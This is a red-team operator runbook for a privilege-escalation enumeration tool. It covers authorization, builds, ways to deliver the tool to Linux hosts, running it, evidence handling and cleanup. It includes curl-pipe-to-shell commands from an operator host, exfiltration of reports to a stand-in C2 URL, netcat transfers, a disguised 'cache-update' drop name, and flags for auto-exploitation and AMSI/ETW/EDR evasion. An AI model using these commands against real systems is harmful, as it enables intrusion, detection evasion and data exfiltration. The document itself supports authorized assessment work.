# Operator Runbook

Copy-paste deployment and execution guide for **authorized** assessments only.

Related docs: [`README.md`](../README.md) · [`build.md`](build.md) · [`techniques.md`](techniques.md) · [`first-user-journey.md`](first-user-journey.md) · [Delivery](runbook/delivery.md)

---

## Task-based navigation

Use the [runbook module index](runbook/README.md) to choose a focused entry
point:

| Task | Module |
| --- | --- |
| Confirm ROE, identity, scope, and stop conditions | [Pre-flight](runbook/preflight.md) |
| Build, verify, and package one artifact | [Build and package](runbook/build-and-package.md) |
| Get the kit onto a Linux or Windows host | [Delivery](runbook/delivery.md) |
| Deploy and run on a Linux or Windows target | [Target operations](runbook/targets.md) |
| Handle evidence, cleanup, interruption, or recovery | [Evidence and recovery](runbook/evidence-and-recovery.md) |

The modules are concise workflow guides. This file remains the detailed
copy-paste reference for transport variants, platform-specific procedures,
operator recipes, and review checklists.

## How to use this runbook

This document is intentionally written as an operator workflow rather than a
catalog of commands. Read sections 0, 1, and the target-specific pre-flight
before selecting a deployment method. Then follow the smallest path that meets
the engagement need:

1. Establish authorization, target identity, evidence handling, and stop
   conditions.
2. Build or obtain one reviewed artifact and record its provenance and hash.
3. Stage it through an approved channel, verify the remote hash, and run a
   non-enumerating health check.
4. Run one enumerate-only baseline. Treat plugin coverage and errors as part of
   the result, not as incidental console output.
5. Narrow follow-up runs to the approved questions. Prefer a triage
   approve-file that names the exact finding IDs permitted for reversible
   probes; use blanket `--auto-exploit` only after a separate decision that
   explicitly permits every supported reversible probe in the selected scope.
6. Export, transfer, review, and retain evidence according to the engagement
   policy. Capture the sealed-report key separately from the sealed file.
7. Verify cleanup and record residual artifacts, telemetry, and limitations in
   the closeout log.

If a command in this document conflicts with the Rules of Engagement (ROE),
the ROE wins. Do not silently substitute a noisier transport, a broader target
set, or a more powerful execution context.

### Operator worksheet

Complete this small record before the first host. It can live in the approved
engagement log; do not put credentials or report keys in an ordinary ticket.

```text
Engagement / case ID:       ______________________________
ROE / authorization ref:    ______________________________
Operator and UTC start:     ______________________________
Target identifier(s):       ______________________________
Approved account/context:   ______________________________
Approved transport:         ______________________________
Approved drop path:         ______________________________
Execution mode:             enumerate-only / limited reversible probes
Approved plugin scope:      all / _________________________
Output policy:              memory / sealed file / approved remote
Evidence classification:   ______________________________
Retention / destruction:    ______________________________
Stop contact / escalation:  ______________________________
Cleanup owner and UTC end:  ______________________________
```

Record these values per host when a run is automated: hostname, address or
asset ID, OS and architecture, effective identity, binary SHA-256, exact
command line, selected/skipped plugins, output path, run ID, and cleanup
status. The run report records some of this automatically, but the engagement
log should also explain operator decisions and out-of-band transfers.

### Operating risk levels

Use the lowest level that answers the assessment question.

| Level | Default action | Approval and handling |
| --- | --- | --- |
| 0 — read-only | `enum` with memory output | Normal ROE coverage; preferred baseline |
| 1 — persistent evidence | Sealed file or approved structured export | Evidence policy, key custody, and retention required |
| 2 — reversible probe | `triage --approve-file approvals.json`, then the scoped follow-up run | Explicit finding IDs, ROE approval, maintenance awareness, and a rollback owner; blanket `enum --auto-exploit` requires approval for every supported probe in scope |

The `--delay-ms` option changes pacing only; it is not a permission boundary,
an audit-log control, or a guarantee that host telemetry will be avoided.

### Universal stop conditions

Stop the run and contact the engagement owner if any of the following occurs:

- The host, account, network path, or execution context is not the one named in
  the ROE.
- A requested action would write outside the approved drop/output path or
  would require persistence, service creation, credential access beyond scope,
  or an exploit not described in the ROE.
- The target becomes unstable, an availability impact is suspected, or a
  defensive control begins containment.
- The binary hash, platform, or plugin set is not the expected one.
- A report key is exposed to an unapproved person or channel.
- A plugin error leaves coverage incomplete and the missing check matters to the
  assessment conclusion.

Do not clear shell history, event logs, EDR artifacts, or other telemetry to
conceal activity. If cleanup or telemetry handling is explicitly authorized,
record exactly what was done and why.

## 0. Pre-flight (do this every time)

1. Confirm written Rules of Engagement (ROE) cover local privilege-escalation enumeration on the target host(s).
2. Confirm evidence handling: memory-only vs sealed file vs operator-controlled remote.
3. Prefer **enumerate-only**. Use finding-scoped triage approval for reversible
   probes; enable blanket `--auto-exploit` only when the ROE allows every
   supported probe in the selected scope.
4. Never run this tool against systems you are not authorized to assess.

Authorization gate (required for the Rust binary):

```bash
# flag form
--i-understand-authorized-use-only

# or environment form
export STEALTHY_AUTHORIZED=1          # Linux / macOS / Git Bash
set STEALTHY_AUTHORIZED=1             # Windows cmd
$env:STEALTHY_AUTHORIZED = "1"        # Windows PowerShell
```

Without the gate, the binary exits with code `2`.

### 0.1 Read-only target pre-flight

Run only the checks appropriate to the approved access method. These commands
are intended to establish identity and compatibility; they do not replace the
authorization review.

Linux:

```bash
set -eu
printf 'host='; hostname
printf 'user='; id -un
printf 'uid='; id -u
printf 'arch='; uname -m
printf 'kernel='; uname -sr
printf 'cwd='; pwd
command -v sha256sum || true
command -v file || true
command -v bash || true
```

Windows PowerShell:

```powershell
$ErrorActionPreference = 'Stop'
Write-Host "host=$env:COMPUTERNAME"
Write-Host "user=$([Security.Principal.WindowsIdentity]::GetCurrent().Name)"
Write-Host "arch=$env:PROCESSOR_ARCHITECTURE"
Write-Host "os=$([Environment]::OSVersion.Version)"
Get-ExecutionPolicy -List
Get-Command Get-FileHash, powershell, cscript -ErrorAction SilentlyContinue |
  Select-Object Name, Source
```

Record unexpected elevation. Running as root or SYSTEM can expose more local
state than the assessment account normally sees and can change the meaning of
findings. If the ROE names a standard-user perspective, stop and relaunch in
that context.

### 0.2 Decide what “success” means before execution

Choose one primary outcome and one fallback before touching the host:

| Assessment question | Primary run | Fallback / limitation to record |
| --- | --- | --- |
| Broad local exposure | All compiled plugins, enumerate-only | Script fallback with reduced coverage |
| One suspected path | `--plugins` for the relevant IDs | Read-only manual verification |
| Repeatability / drift | Same plugin set and output format as baseline | Compare only common coverage |
| CI or fleet gate | `--quiet --format json --fail-on ...` | Preserve JSON and inspect coverage errors |
| Host policy compatibility | `doctor`, `list-plugins`, then baseline | Prefer script fallback; use `--allow-techniques endpoint-bypass` only with approval (alternate-path + approved-fixture validation) |

An empty finding list is not proof of a clean host. A valid conclusion requires
the expected OS build, plugin coverage with no material errors, and a recorded
identity and scope.

### 0.3 Build provenance and evidence custody

For every artifact, record the repository revision, build command, toolchain,
target triple, artifact hash, and who approved its use. Keep the sealed-report
key in a separate approved secret store or handoff channel. Do not put the key
in the same directory, archive, terminal transcript, or ticket as the sealed
report.

Useful operator-side provenance commands:

```bash
git rev-parse HEAD
rustc --version
cargo --version
sha256sum target/release/stealthy
file target/release/stealthy
```

For a Windows artifact built on Linux, hash the `.exe` with `sha256sum` on the
operator host and verify it again with `Get-FileHash` on the target. A matching
hash proves transfer integrity; it does not prove that the binary is approved
for the target or that the target is in scope.

---

## 1. Build matrix (operator workstation)

Run these on your **build** machine, not necessarily on the target.

### 1.1 Native Linux x86_64

```bash
cd /path/to/StealthyPrivesc
cargo build -p stealthy --release
ls -la target/release/stealthy
./target/release/stealthy --help
./target/release/stealthy disclaimer
```

Artifact: `target/release/stealthy`

### 1.2 Linux aarch64 (cross from x86_64 Linux)

```bash
rustup target add aarch64-unknown-linux-gnu
# Debian/Ubuntu example linker package:
# sudo apt-get install -y gcc-aarch64-linux-gnu
cargo build -p stealthy --release --target aarch64-unknown-linux-gnu
ls -la target/aarch64-unknown-linux-gnu/release/stealthy
```

Artifact: `target/aarch64-unknown-linux-gnu/release/stealthy`

### 1.3 Windows x64 from Linux (MinGW)

```bash
rustup target add x86_64-pc-windows-gnu
# Debian/Ubuntu:
# sudo apt-get install -y mingw-w64
cargo build -p stealthy --release --target x86_64-pc-windows-gnu
ls -la target/x86_64-pc-windows-gnu/release/stealthy.exe
```

Artifact: `target/x86_64-pc-windows-gnu/release/stealthy.exe`

### 1.4 Native Windows (MSVC or GNU toolchain on Windows)

```powershell
cd C:\path\to\StealthyPrivesc
cargo build -p stealthy --release
dir .\target\release\stealthy.exe
.\target\release\stealthy.exe --help
.\target\release\stealthy.exe disclaimer
```

Artifact: `target\release\stealthy.exe`

### 1.5 Build verification before packaging

Run the project checks on the reviewed source tree before distributing an
artifact. These commands are operator-workstation checks; they do not touch a
target host.

```bash
set -euo pipefail
cargo fmt --all -- --check
cargo test --locked --workspace
cargo build --locked --workspace --release

git rev-parse HEAD > build-commit.txt
rustc --version > build-toolchain.txt
sha256sum target/release/stealthy > stealthy-linux-x64.sha256
file target/release/stealthy
./target/release/stealthy --version
./target/release/stealthy doctor --json
```

If a check fails, do not package the artifact as if it were verified. Keep the
failure and remediation in the build log. If you intentionally ship an
artifact built with a different command or toolchain, record that exception
and obtain the required approval first.

### 1.6 Package a full delivery kit

Use the same canonical packager as the tag workflow. It includes the binary,
platform fallbacks, selected operator docs, `RELEASE-MANIFEST.json`, and
internal checksums:

```bash
python3 scripts/release/package.py \
  --platform linux --arch x86_64 \
  --target x86_64-unknown-linux-gnu \
  --binary target/release/stealthy \
  --output stealthy-linux-x86_64.tar.gz \
  --version local --commit "$(git rev-parse HEAD)"
```

For a local Windows GNU build, the same packager can create a review kit, but
the published support artifact is Windows x86-64 MSVC:

```bash
python3 scripts/release/package.py \
  --platform windows --arch x86_64 \
  --target x86_64-pc-windows-gnu \
  --binary target/x86_64-pc-windows-gnu/release/stealthy.exe \
  --output stealthy-windows-x86_64.zip \
  --version local --commit "$(git rev-parse HEAD)"
```

Tagged releases additionally publish SPDX JSON SBOMs, a top-level checksum
manifest, and GitHub artifact attestations after the full tag gate. See
[Build](build.md) and the [Support Policy](support-policy.md).

### 1.7 Stage a drop bundle (preferred unit of copy)

Do this on the operator workstation. The staged directory is what you copy to
the target — not a lone binary and not a GitHub installer. The published
installers in `scripts/install.sh` and `scripts/install.ps1` are for the
operator box only.

Operator catalog (method chooser, drop paths, after-drop verify):
[Get the kit onto a host](runbook/delivery.md).

Native kit (binary + dispatcher + fallbacks):

```bash
./target/release/stealthy stage \
  --os linux --arch x86_64 \
  --target-hostname TARGET_HOSTNAME \
  --name cache-update \
  --out ./drop-linux \
  --binary ./target/release/stealthy

./target/release/stealthy stage \
  --os windows --arch x86_64 \
  --target-hostname TARGET_HOSTNAME \
  --name cache-update \
  --out ./drop-windows \
  --binary ./target/x86_64-pc-windows-gnu/release/stealthy.exe
```

Script-only kit (omit `--binary` when the PE/ELF is expected to be blocked):

```bash
./target/release/stealthy stage --os linux --target-hostname TARGET_HOSTNAME --out ./drop-linux
./target/release/stealthy stage --os windows --target-hostname TARGET_HOSTNAME --out ./drop-windows
```

`--target-hostname` must be the real target hostname; the dispatcher refuses
`AUTO`. Optional `--target-username` binds the run to that account. Default
`--name` is `cache-update`. Sign a Windows PE with the org Authenticode
workflow before `--binary`; this tool does not create certificates.

Print transport placeholders after staging (replace host and path per ROE):

```bash
./target/release/stealthy one-liners --os linux --transport ssh
./target/release/stealthy one-liners --os windows --transport winrm
```

Supported `one-liners` transports: Linux `ssh` / `scp` / `http` / `smb`;
Windows `ssh` / `scp` / `winrm` / `smb` / `http`.

---

## 2. Deploy to a Linux target

### 2.0 Placeholders and drop-path choices

```bash
TARGET='user@10.0.0.20'          # or user@host
SSH_PORT=22
IDENTITY="$HOME/.ssh/id_ed25519" # optional
JUMP='bastion.example'           # optional ProxyJump
REMOTE_DIR='$HOME/.cache/cache-update'  # change per ROE; /tmp is often noexec
BIN_LOCAL='target/release/stealthy'
STAGE_DIR='./drop-linux'               # output of `stealthy stage --os linux ...`
EXPECTED_SHA256='REPLACE_WITH_sha256sum_OUTPUT'
```

| Drop path | Pros | Cons |
| --- | --- | --- |
| `/tmp/...` | Usually writable | Often cleaned, sometimes `noexec`, heavily monitored |
| `/dev/shm/...` | tmpfs, fast, often exec-ok | Lost on reboot; may be watched |
| `$HOME/.cache/...` | Looks more “user-like” | Survives longer if you forget cleanup |
| Existing tool dir already in ROE | Least surprising | Must already be approved |

Always prefer a path allowed by ROE. If the mount is `noexec`, use **script-only** deploy (section 2.12) instead of forcing a binary. The operator-facing catalog of every method is [Get the kit onto a host](runbook/delivery.md).

**Preferred: copy the staged bundle** (section 1.7), not a lone ELF:

```bash
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" "mkdir -p '$REMOTE_DIR'"
scp -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} -r "$STAGE_DIR"/. "$TARGET:$REMOTE_DIR/"
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" \
  "chmod 750 '$REMOTE_DIR/cache-update' && sha256sum '$REMOTE_DIR/cache-update'"
```

Then run **2.13 verify**. If the ELF cannot start, use `bash $REMOTE_DIR/scripts/run.sh --authorized enum` (section 2.12 / 3.7). Do not rerun `install.sh` on the target.

**Method chooser**

| Situation | Prefer |
| --- | --- |
| Staged bundle over SSH (default) | Copy `$STAGE_DIR/.` as above, then 2.13 |
| Normal SSH file copy of one ELF | 2.1 SCP / 2.2 rsync / 2.3 SFTP |
| Jump host / bastion | 2.4 ProxyJump |
| No SCP but SSH shell works | 2.5 SSH stdin pipe (ELF or `tar` stream of `$STAGE_DIR`) |
| Egress to operator HTTP allowed | 2.6 HTTP(S) pull |
| Broken SCP, raw TCP allowed briefly | 2.7 netcat / socat |
| Shared NFS/SMB mount | 2.8 mount copy |
| Container / adjacent host access | 2.9 docker cp / kubectl cp |
| Interactive only / tiny channel | 2.10 base64 paste / split |
| Many hosts or a release tarball | 2.11 |
| Custom ELF blocked or `noexec` | 2.12 script-only |

After every binary drop, run **2.13 verify**.

### 2.1 SCP single binary

```bash
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" "mkdir -p '$REMOTE_DIR'"
scp -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} \
  "$BIN_LOCAL" "$TARGET:$REMOTE_DIR/stealthy"
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" \
  "chmod 750 '$REMOTE_DIR/stealthy' && '$REMOTE_DIR/stealthy' --help"
```

Preserve times/mode:

```bash
scp -p -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} \
  "$BIN_LOCAL" "$TARGET:$REMOTE_DIR/stealthy"
```

### 2.2 rsync over SSH (resume-friendly)

```bash
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" "mkdir -p '$REMOTE_DIR'"
rsync -avP -e "ssh -p $SSH_PORT ${IDENTITY:+-i $IDENTITY}" \
  "$BIN_LOCAL" "$TARGET:$REMOTE_DIR/stealthy"
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" \
  "chmod 750 '$REMOTE_DIR/stealthy'"
```

Full bundle:

```bash
rsync -avP -e "ssh -p $SSH_PORT ${IDENTITY:+-i $IDENTITY}" \
  release-staging/stealthy-linux-x64/ "$TARGET:$REMOTE_DIR/"
```

### 2.3 SFTP batch

```bash
sftp -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} -b - "$TARGET" <<EOF
mkdir $REMOTE_DIR
cd $REMOTE_DIR
put $BIN_LOCAL stealthy
chmod 750 stealthy
bye
EOF
```

Interactive:

```bash
sftp -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET"
# mkdir /tmp/.cache-update
# put target/release/stealthy stealthy
# chmod 750 stealthy
# bye
```

### 2.4 SCP / SSH via ProxyJump (bastion)

```bash
ssh -J "$JUMP" -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" "mkdir -p '$REMOTE_DIR'"
scp -o "ProxyJump=$JUMP" -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} \
  "$BIN_LOCAL" "$TARGET:$REMOTE_DIR/stealthy"
```

`~/.ssh/config` form:

```sshconfig
Host target-prod
  HostName 10.0.0.20
  User user
  Port 22
  IdentityFile ~/.ssh/id_ed25519
  ProxyJump bastion.example
```

```bash
scp "$BIN_LOCAL" target-prod:"$REMOTE_DIR/stealthy"
ssh target-prod "chmod 750 $REMOTE_DIR/stealthy && $REMOTE_DIR/stealthy --help"
```

### 2.5 SSH stdin pipe (no SCP binary required on PATH)

Raw bytes (fastest):

```bash
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" \
  "mkdir -p '$REMOTE_DIR' && cat > '$REMOTE_DIR/stealthy' && chmod 750 '$REMOTE_DIR/stealthy'" \
  < "$BIN_LOCAL"
```

With remote checksum printback:

```bash
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" \
  "mkdir -p '$REMOTE_DIR' && cat > '$REMOTE_DIR/stealthy' && chmod 750 '$REMOTE_DIR/stealthy' && sha256sum '$REMOTE_DIR/stealthy'" \
  < "$BIN_LOCAL"
```

Gzip to shrink transfer:

```bash
gzip -c "$BIN_LOCAL" | ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" \
  "mkdir -p '$REMOTE_DIR' && gzip -dc > '$REMOTE_DIR/stealthy' && chmod 750 '$REMOTE_DIR/stealthy'"
```

### 2.6 HTTP(S) pull on target

Operator listener (approved channel only):

```bash
cd release-staging
python3 -m http.server 8000 --bind 0.0.0.0
# better: bind to VPN/tun address only, e.g. --bind 10.8.0.1
```

Target pull options:

```bash
REMOTE_DIR=/tmp/.cache-update
URL='http://OPERATOR:8000/stealthy-linux-x64/stealthy'
mkdir -p "$REMOTE_DIR"

# curl
curl -fsSL "$URL" -o "$REMOTE_DIR/stealthy"

# wget
wget -q -O "$REMOTE_DIR/stealthy" "$URL"

# busybox wget
busybox wget -q -O "$REMOTE_DIR/stealthy" "$URL"

# python3 only
python3 - <<PY
from urllib.request import urlretrieve
urlretrieve("$URL", "$REMOTE_DIR/stealthy")
PY

chmod 750 "$REMOTE_DIR/stealthy"
"$REMOTE_DIR/stealthy" --help
```

HTTPS with a lab self-signed cert (expect TLS warnings unless you pin CA):

```bash
curl -fsSL --cacert /path/to/lab-ca.pem \
  "https://OPERATOR:8443/stealthy-linux-x64/stealthy" \
  -o "$REMOTE_DIR/stealthy"
```

Pull tarball then extract:

```bash
curl -fsSL "http://OPERATOR:8000/stealthy-linux-x64.tar.gz" -o /tmp/s.tgz
tar -xzf /tmp/s.tgz -C /tmp
chmod 750 /tmp/stealthy-linux-x64/stealthy
```

### 2.7 netcat / socat raw push

**Noisy / short-lived.** Use only when SSH file copy is unavailable and ROE allows ephemeral listeners.

On target:

```bash
REMOTE_DIR=/tmp/.cache-update
mkdir -p "$REMOTE_DIR"
# prefer a high ephemeral port approved for the engagement
nc -l -p 4444 > "$REMOTE_DIR/stealthy"
# or: socat -u TCP-LISTEN:4444,reuseaddr CREATE:"$REMOTE_DIR/stealthy"
chmod 750 "$REMOTE_DIR/stealthy"
```

On operator:

```bash
nc TARGET_IP 4444 < target/release/stealthy
# or: socat -u FILE:target/release/stealthy TCP:TARGET_IP:4444
```

Reverse direction (target pulls from operator listener):

```bash
# operator
nc -l -p 4444 < target/release/stealthy
# target
nc OPERATOR_IP 4444 > "$REMOTE_DIR/stealthy"
```

### 2.8 Shared mount (NFS / SMB / SSHFS)

```bash
# SSHFS from operator (mount target dir locally, then cp)
mkdir -p /mnt/target-drop
sshfs "$TARGET:$REMOTE_DIR" /mnt/target-drop
cp -a "$BIN_LOCAL" /mnt/target-drop/stealthy
fusermount -u /mnt/target-drop   # or: umount /mnt/target-drop
ssh "$TARGET" "chmod 750 '$REMOTE_DIR/stealthy'"
```

If an NFS/SMB share is already mounted on both sides:

```bash
cp -a target/release/stealthy /mnt/engagement-share/stealthy
ssh "$TARGET" 'cp /mnt/engagement-share/stealthy '"$REMOTE_DIR"'/stealthy && chmod 750 '"$REMOTE_DIR"'/stealthy'
```

### 2.9 Container / Kubernetes adjacent copy

Docker (host has access to container):

```bash
docker cp target/release/stealthy CONTAINER_ID:/tmp/stealthy
docker exec CONTAINER_ID chmod 750 /tmp/stealthy
docker exec -it CONTAINER_ID /tmp/stealthy --help
```

kubectl:

```bash
kubectl cp target/release/stealthy NAMESPACE/POD:/tmp/stealthy
kubectl exec -n NAMESPACE POD -- chmod 750 /tmp/stealthy
kubectl exec -n NAMESPACE POD -- /tmp/stealthy --help
```

### 2.10 Base64 paste / split files (constrained channels)

Build host:

```bash
base64 -w0 target/release/stealthy > /tmp/stealthy.b64
wc -c /tmp/stealthy.b64
# optional split for chat/ticket paste limits
split -b 500k /tmp/stealthy.b64 /tmp/stealthy.b64.part.
ls /tmp/stealthy.b64.part.*
```

Target reassembly:

```bash
cat stealthy.b64.part.* > stealthy.b64
base64 -d stealthy.b64 > "$REMOTE_DIR/stealthy"
chmod 750 "$REMOTE_DIR/stealthy"
```

Interactive heredoc:

```bash
base64 -d > "$REMOTE_DIR/stealthy" <<'B64'
PASTE_BASE64_HERE
B64
chmod 750 "$REMOTE_DIR/stealthy"
```

`xxd` hex alternative when `base64` is missing:

```bash
# build host
xxd -p target/release/stealthy > /tmp/stealthy.hex
# target
xxd -r -p stealthy.hex > "$REMOTE_DIR/stealthy"
chmod 750 "$REMOTE_DIR/stealthy"
```

### 2.11 SCP full tarball / ansible-style loop

Tarball:

```bash
scp -P "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} \
  stealthy-linux-x64.tar.gz "$TARGET:/tmp/"
ssh -p "$SSH_PORT" ${IDENTITY:+-i "$IDENTITY"} "$TARGET" 'set -e
  cd /tmp
  tar -xzf stealthy-linux-x64.tar.gz
  cd stealthy-linux-x64
  chmod 750 stealthy scripts/linux/*
  ./stealthy disclaimer
'
```

Multiple hosts:

```bash
for h in user@10.0.0.21 user@10.0.0.22 user@10.0.0.23; do
  echo "== $h =="
  ssh "$h" "mkdir -p '$REMOTE_DIR'"
  scp "$BIN_LOCAL" "$h:$REMOTE_DIR/stealthy"
  ssh "$h" "chmod 750 '$REMOTE_DIR/stealthy' && sha256sum '$REMOTE_DIR/stealthy'"
done
```

### 2.12 Script-only deploy (no custom ELF)

When AppArmor/`noexec`/policy blocks the binary. The script fallbacks now also
print AppArmor/SELinux/`noexec` inventory. Enumeration fallbacks do not disable
those controls; `endpoint-bypass` remains alternate-path / approved-fixture
only (see `docs/techniques.md`).

```bash
scp scripts/linux/enum.sh scripts/linux/enum.py scripts/linux/enum-posix.sh scripts/linux/enum.pl \
  scripts/linux/run.sh "$TARGET:$REMOTE_DIR/"
ssh "$TARGET" "chmod 750 $REMOTE_DIR/enum.* $REMOTE_DIR/run.sh
  bash $REMOTE_DIR/run.sh --authorized"
```

Direct tiers when the dispatcher itself is unavailable:

```bash
ssh "$TARGET" "python3 $REMOTE_DIR/enum.py --authorized"
ssh "$TARGET" "bash $REMOTE_DIR/enum.sh --authorized"
ssh "$TARGET" "sh $REMOTE_DIR/enum-posix.sh --authorized"
ssh "$TARGET" "perl $REMOTE_DIR/enum.pl --authorized"
```

When the PE/ELF *can* run, still collect control inventory:

```bash
STEALTHY_AUTHORIZED=1 "$BIN" enum --plugins linux.endpoint_controls
```

No disk scripts (stdin only):

```bash
ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 bash -s' < scripts/linux/enum.sh
ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 python3 -' < scripts/linux/enum.py
ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 sh -s' < scripts/linux/enum-posix.sh
ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 perl -' < scripts/linux/enum.pl
```

Curl-pipe (only from an operator URL you control; still leaves process cmdline artifacts):

```bash
curl -fsSL "http://OPERATOR:8000/enum.sh" | STEALTHY_AUTHORIZED=1 bash
curl -fsSL "http://OPERATOR:8000/enum.py" | STEALTHY_AUTHORIZED=1 python3 -
curl -fsSL "http://OPERATOR:8000/enum-posix.sh" | STEALTHY_AUTHORIZED=1 sh
curl -fsSL "http://OPERATOR:8000/enum.pl" | STEALTHY_AUTHORIZED=1 perl -
```

### 2.13 Post-deploy verify (Linux)

```bash
ssh "$TARGET" "set -e
  f='$REMOTE_DIR/stealthy'
  ls -la \"\$f\"
  file \"\$f\"
  sha256sum \"\$f\"
  \"\$f\" --help >/dev/null
  \"\$f\" disclaimer | head -n 5
"
# compare printed hash to:
sha256sum "$BIN_LOCAL"
```

`noexec` quick test:

```bash
ssh "$TARGET" "$REMOTE_DIR/stealthy --help" \
  || echo 'EXEC FAILED — switch to script-only (2.12)'
```

---

## 3. Run on a Linux target

Assume binary is at `$BIN` (example `/tmp/.cache-update/stealthy`).

### 3.1 First safe run (enumerate only, memory output)

```bash
BIN=/tmp/.cache-update/stealthy
"$BIN" guide
"$BIN" disclaimer
"$BIN" --authorized list-plugins
"$BIN" --authorized enum
```

Quiet / high-signal / machine formats:

```bash
STEALTHY_AUTHORIZED=1 "$BIN" -q enum
STEALTHY_AUTHORIZED=1 "$BIN" --no-color enum --min-severity high
STEALTHY_AUTHORIZED=1 "$BIN" --format json -q enum > findings.json
STEALTHY_AUTHORIZED=1 "$BIN" --format markdown enum > report.md
```

### 3.2 Plugin selection

```bash
STEALTHY_AUTHORIZED=1 "$BIN" enum \
  --plugins linux.sudo,linux.suid,linux.containers,linux.groups,linux.credentials

STEALTHY_AUTHORIZED=1 "$BIN" enum \
  --skip linux.suid,linux.wildcard_cron
```

### 3.3 Low-and-slow

```bash
STEALTHY_AUTHORIZED=1 "$BIN" --delay-ms 200 enum
STEALTHY_AUTHORIZED=1 "$BIN" --delay-ms 0 enum   # disable jitter
```

### 3.4 Sealed file output

```bash
OUT=/tmp/findings.seal
KEY_OUT=/approved/keys/findings.key
STEALTHY_AUTHORIZED=1 "$BIN" --verbose \
  --output file --output-path "$OUT" --key-output-path "$KEY_OUT" \
  enum
# The full key is never printed to stderr. Move KEY_OUT into approved secret
# handling and do not retain it beside OUT.
ls -la "$OUT"
```

Plaintext JSON (explicit; noisier on disk):

```bash
STEALTHY_AUTHORIZED=1 "$BIN" \
  --output file --output-path /tmp/findings.json \
  --plaintext-file \
  enum
```

### 3.5 Remote output mode

Remote output seals the report, writes the key only to the protected key path,
and POSTs the sealed body to an absolute HTTPS URL. A missing HTTPS client,
connection failure, timeout, or non-success HTTP response fails the command.
The request is bounded to a 10-second connection timeout and 30-second total
timeout:

```bash
export STEALTHY_EXFIL_URL='https://c2.example/intake'
STEALTHY_AUTHORIZED=1 "$BIN" --output remote \
  --exfil-url "$STEALTHY_EXFIL_URL" \
  --key-output-path /approved/keys/remote.key enum
```

The encrypted body is sent through standard input and is not printed or placed
in process arguments. Keep the protected key separately from the receiver.

### 3.6 Limited auto-exploit (ROE required)

```bash
STEALTHY_AUTHORIZED=1 "$BIN" enum --auto-exploit
```

High-impact families (kernel exploit, service replace, persistence, Potato, MSI,
credential dump, host-crash, endpoint bypass) stay off unless you also pass
`--allow-techniques` when ROE permits:

```bash
STEALTHY_AUTHORIZED=1 "$BIN" enum --auto-exploit \
  --allow-techniques kernel-exploit,service-replace,persistence
```

In this revision most non-evasion IDs are scaffolded (flag accepted + findings
recorded); payload execution for those families lands in follow-up work.
`endpoint-bypass` is alternate-path + approved-fixture validation only.
AMSI/ETW/AV-EDR interference uses `amsi-bypass` / `etw-unhook` /
`av-edr-service` with `--confirm-evasion` (see `docs/techniques.md` and
`docs/evasion.md`).

### 3.7 Script fallback execution

Prefer the staged dispatcher, which walks `python → bash → sh → perl` when the
ELF is blocked. Script tiers are reduced coverage; only auth and `--json` are
forwarded from the binary CLI.

```bash
bash /path/to/drop/scripts/run.sh --authorized --profile balanced enum
```

Direct scripts (troubleshooting only):

```bash
python3 /tmp/enum.py --authorized | tee /tmp/enum-python.txt
bash /tmp/enum.sh --authorized | tee /tmp/enum-shell.txt
sh /tmp/enum-posix.sh --authorized | tee /tmp/enum-posix.txt
perl /tmp/enum.pl --authorized | tee /tmp/enum-perl.txt
```

### 3.8 Linux cleanup (run after evidence handling)

Complete the evidence capture, validation, and review in sections 3.9–3.12
before executing this cleanup block. It is shown here as the short, host-side
removal recipe; cleanup is the final step, not a substitute for evidence
verification.

```bash
BIN=/tmp/.cache-update/stealthy
rm -f "$BIN" /tmp/findings.seal /tmp/findings.json /tmp/enum.sh /tmp/enum.py
rm -rf /tmp/stealthy-linux-x64 /tmp/stealthy-drop /tmp/.cache-update
# Preserve shell history and host telemetry unless the ROE explicitly defines
# a separate, auditable handling procedure.
```

Best-effort overwrite helper is available in-source as `secure_delete_hint` for operators extending the toolkit; default CLI does not auto-wipe.

### 3.9 Capture a clean baseline and validate it

For an evidence-quality JSON baseline, keep machine output on stdout and
diagnostics on a separately retained stderr file. Do not mix a terminal
transcript into JSON.

```bash
BIN=/tmp/.cache-update/stealthy
RUN_UTC=$(date -u +%Y%m%dT%H%M%SZ)
REPORT="linux-${RUN_UTC}.json"
STDERR="linux-${RUN_UTC}.stderr.txt"

STEALTHY_AUTHORIZED=1 "$BIN" --quiet --no-color --format json \
  --output memory enum > "$REPORT" 2> "$STDERR"

# Memory mode does not create an artifact ledger; explicit file output,
# checkpoints, and staging are tracked separately when requested.

# Optional structural checks; use whichever validator is approved.
python3 -m json.tool "$REPORT" >/dev/null
if command -v jq >/dev/null 2>&1; then
  jq -e '.schema_version == "2" and (.run_id | length > 0)' "$REPORT" >/dev/null
fi
```

If `jq` is unavailable, the Python check is still useful. Preserve the stderr
file when it contains warnings or plugin errors. Never infer success from the
process exit code alone: a normal exit can still contain errored plugin
coverage, and `--fail-on` changes the meaning of exit `4`.

To capture Markdown for human review, use a separate file and keep the command
quiet so progress messages do not appear in the document:

```bash
STEALTHY_AUTHORIZED=1 "$BIN" --quiet --no-color --format markdown enum \
  > "linux-${RUN_UTC}.md" 2> "linux-${RUN_UTC}.stderr.txt"
```

### 3.10 Evidence-safe sealed output

Sealed output is encrypted with a fresh key for the run. The sealed file and
the key are separate assets: possession of the file alone is not enough to
